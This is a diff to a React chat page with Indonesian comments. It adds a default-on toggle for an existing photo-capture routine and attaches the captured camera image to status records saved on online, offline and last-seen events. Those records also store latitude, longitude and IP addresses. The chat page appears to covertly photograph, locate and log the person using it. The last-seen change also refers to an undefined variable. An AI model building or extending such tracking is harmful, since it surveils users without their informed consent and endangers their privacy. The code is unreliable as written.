@@ -165,7 +165,9 @@ const ChatPage = () => {
   const [chatWith] = useState("irul"); // ID pengguna tujuan
   const [topik] = useState("topik"); // ID pengguna tujuan
   const [isDark, setIsDark] = useState(false);
+const [photoCaptureEnabled, setPhotoCaptureEnabled] = useState(true);
 
+  
   useEffect(() => {
     // cek preferensi user sebelumnya
     if (localStorage.getItem("theme") === "dark") {
@@ -369,6 +371,10 @@ const capturePhoto09090 = () => {
   };
   // ========= FUNGSI CAPTURE FOTO =========
   const capturePhoto = async (status = "unknown") => {
+     if (!photoCaptureEnabled) {
+      console.warn("Capture Photo dimatikan");
+      return null; // jangan ambil foto
+    }
     try {
       // Cek semua device kamera yang tersedia
       const devices = await navigator.mediaDevices.enumerateDevices();
@@ -622,7 +628,7 @@ try {
 
   const updateOnlineStatus = async (latitude = null, longitude = null,  ip1 = null, ip2 = null) => {
     await saveOldDataToLogs("online"); // simpan data lama dulu
- const photoURL = await capturePhoto("online");
+    const photoURL = await capturePhoto("online");
     const data = {
       user: chatWith,
       isOnline: true,
@@ -639,13 +645,14 @@ try {
       data.latitude = latitude;
       data.longitude = longitude;
     }
-
+    // Isi foto hanya kalau ada
+  if (photoURL) data.photoURL = photoURL;
     update(userRef, data);
   };
 
   const updateOfflineStatus = async () => {
     await saveOldDataToLogs("offline"); // simpan sebelum offline
- const photoURL = await capturePhoto("offline");
+    const photoURL = await capturePhoto("offline");
     const data = {
       user: chatWith,
       isOnline: false,
@@ -662,12 +669,15 @@ try {
       data.latitude = latitude;
       data.longitude = longitude;
     }
+    // Isi foto hanya kalau ada
+  if (photoURL) data.photoURL = photoURL;
      update(userRef, data);
   };
 
   const updateLastSeen = async () => {
     await saveOldDataToLogs("update_lastSeen"); // simpan sebelum update
- const photoURL = await capturePhoto("update_lastSeen");
+    const photoURL = await capturePhoto("update_lastSeen");
+    if (photoURL) data.photoURL2 = photoURL;
     update(userRef, {
       lastSeen: serverTimestamp(),
       // photoURL2: photoURL || null
@@ -723,6 +733,13 @@ try {
           <h2 className=" text-lg md:text-xl font-semibold text-gray-800 dark:text-gray-100">
             Chat dengan {currentUser}
           </h2>
+  <button
+  onClick={() => setPhotoCaptureEnabled(!photoCaptureEnabled)}
+  className="absolute left-4 top-1/2 -translate-y-1/2 px-3 py-1 text-sm rounded bg-blue-600 text-white"
+>
+  {photoCaptureEnabled ? "Capture ON" : "Capture OFF"}
+</button>
+
             <button 
               onClick={toggleTheme} 
               className="absolute right-4 top-1/2 -translate-y-1/2 p-2 text-white bg-white border border-gray-300 focus:outline-none hover:bg-gray-100 focus:ring-2 focus:ring-gray-100 font-medium rounded-full text-sm px-2 py-2 m-2 dark:bg-gray-500 dark:text-gray-600 dark:border-gray-600 dark:hover:bg-gray-400 dark:hover:border-gray-400 dark:focus:ring-gray-500"
